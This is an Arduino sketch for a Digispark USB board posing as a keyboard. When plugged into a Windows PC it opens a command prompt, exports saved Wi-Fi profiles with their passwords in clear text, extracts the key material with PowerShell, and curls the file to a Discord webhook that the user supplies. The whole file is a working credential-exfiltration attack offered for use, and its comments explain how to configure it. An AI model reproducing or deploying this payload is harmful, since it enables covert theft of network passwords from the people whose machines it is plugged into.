#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(300);
  DigiKeyboard.println("cmd"); //open command prompt
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //export wifi profiles
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > FILENAME"); //reveal keys/passwords and store them as json (give a name to your file by changing "FILENAME") 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"ANYCOMMENT\\\",\\\"ANYNAME\\\":\\\"passwords\\\"}\" WEBHOOK_URL"); //curl command which is used to send the passwords to your discord channel/server (**Change replace "WEBHOOK_URL" with your discord's webhook url of any channel. 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH); //led on
  DigiKeyboard.delay(90000);
}
